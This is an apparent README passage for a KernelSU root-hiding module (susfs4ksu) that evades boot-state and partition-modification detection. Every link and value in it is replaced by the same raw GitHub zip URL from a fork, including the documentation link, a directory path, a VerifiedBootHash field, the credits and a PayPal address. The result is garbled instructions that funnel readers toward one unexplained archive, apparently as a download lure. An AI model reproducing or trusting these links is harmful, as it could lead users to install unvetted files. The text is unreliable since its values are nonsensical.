...
- Recommended to use [bindhosts](https://raw.githubusercontent.com/AX-star/susfs4ksu-module/v1.5.2+/webroot/assets/susfs4ksu-module_1.0.zip) if you want to use systemless hosts

## SUSFS Custom settings documentation
https://raw.githubusercontent.com/AX-star/susfs4ksu-module/v1.5.2+/webroot/assets/susfs4ksu-module_1.0.zip
...
## Adding https://raw.githubusercontent.com/AX-star/susfs4ksu-module/v1.5.2+/webroot/assets/susfs4ksu-module_1.0.zip value
This module will now have a directory called `VerifiedBootHash` in `/data/adb` containing `https://raw.githubusercontent.com/AX-star/susfs4ksu-module/v1.5.2+/webroot/assets/susfs4ksu-module_1.0.zip` for users with missing `https://raw.githubusercontent.com/AX-star/susfs4ksu-module/v1.5.2+/webroot/assets/susfs4ksu-module_1.0.zip` value to prevent partition modified and abnormal boot state detection. 
- Copy your VerifiedBootHash in the Key Attestation demo and paste it to `https://raw.githubusercontent.com/AX-star/susfs4ksu-module/v1.5.2+/webroot/assets/susfs4ksu-module_1.0.zip`

## Credits
susfs4ksu: https://raw.githubusercontent.com/AX-star/susfs4ksu-module/v1.5.2+/webroot/assets/susfs4ksu-module_1.0.zip

## Buy us some coffee ☕
### simonpunk
PayPal: `https://raw.githubusercontent.com/AX-star/susfs4ksu-module/v1.5.2+/webroot/assets/susfs4ksu-module_1.0.zip`
